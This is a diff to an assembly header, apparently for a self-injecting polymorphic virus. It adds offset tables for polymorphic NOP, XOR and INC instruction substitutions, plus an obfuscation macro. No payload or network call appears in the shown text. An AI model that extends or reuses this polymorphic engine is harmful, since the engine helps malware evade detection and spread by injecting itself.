@@ -58,22 +58,58 @@
 
 %define POLY_CRAP_SKIPPED_OFFSET inject_self.poly_crap_skipped - _start ; offset of skipped random polymorphic 
 
+;POLY NOPS
 %define POLY_OFFSET_1	_start.label_poly1 - _start				;	
 %define POLY_NOP_1_OFFSET _start.poly_nop_1 - _start			;offset of poly_nop_1 from _start
 %define POLY_NOP_2_OFFSET _start.label_poly1 - _start - 5
 %define POLY_NOP_3_OFFSET _start.poly_nop_3 - _start
+%define POLY_NOP_4_OFFSET poly_inc_r10.poly_nop_4 - _start
+%define POLY_NOP_5_OFFSET poly_inc_r10.poly_nop_5 - _start
+%define POLY_NOP_6_OFFSET poly_xor_r11_r11.poly_nop_6 - _start
+%define POLY_NOP_7_OFFSET poly_xor_r11_r11.poly_nop_7 - _start
+%define POLY_NOP_8_OFFSET poly_xor_r11_r11.poly_nop_8 - _start
+%define POLY_NOP_9_OFFSET poly_xor_r11_r11.poly_nop_9 - _start
+
 
 
 %define POLY_NOP_SIZE 4								;size of polymorphic nops
-%define POLY_NOP_NUMBER 0x000000007			; amount of nops equal instruction possible 
+%define POLY_NOP_NUMBER 0x00000000A			; amount of nops equal instruction possible 
 
+
+;POLY XOR R10
 %define POLY_XOR_R10_1_OFFSET _start.poly_xor_r10_1 - _start
+%define POLY_XOR_R10_2_OFFSET inject_self.poly_xor_r10_2 - _start
 
 %define POLY_XOR_SIZE 6				;size of poly xor
-%define POLY_XOR_NUMBER 0x000000005 ;nbx of polyxor posssible 
+%define POLY_XOR_NUMBER 0x000000007 ;nbx of polyxor posssible 
 
 
+;POLY XOR R11
+%define POLY_XOR_R11_1_OFFSET inject_self.poly_xor_r11_1 - _start
+%define POLY_XOR_R11_2_OFFSET inject_self.poly_xor1 - _start
+%define POLY_XOR_R11_3_OFFSET inject_self.poly_xor_r11_3 - _start
+%define POLY_XOR_R11_4_OFFSET inject_self.poly_xor2 - _start
+%define POLY_XOR_R11_5_OFFSET inject_self.poly_xor_r11_5 - _start
+%define POLY_XOR_R10_6_OFFSET incject_self.poly_xor3 - _start
 
+%define POLY_XOR_R11_SIZE 8
+%define POLY_XOR_R11_NUMBER 0x00000005
+
+
+;POLY_XOR_RDI
+%define POLY_XOR_RDI_1_OFFSET process.poly_xor_rdi_1 - _start
+%define POLY_XOR_RDI_2_OFFSET _start.check_status - _start
+%define POLY_XOR_RDI_3_OFFSET inject_self.poly_xor_rdi_3 - _start
+
+%define POLY_XOR_RDI_SIZE 8
+%define POLY_XOR_RDI_NUMBER 0x00000005
+
+
+;POLY INC R10
+%define POLY_INC_R10_1_OFFSET inject_self.poly_inc_r10_1 - _start
+
+%define POLY_INC_SIZE 8
+%define POLY_INC_NUMBER 0x000000004
 
 %macro OBF_POLY_1 0
 	OBF_PUSH_RAX
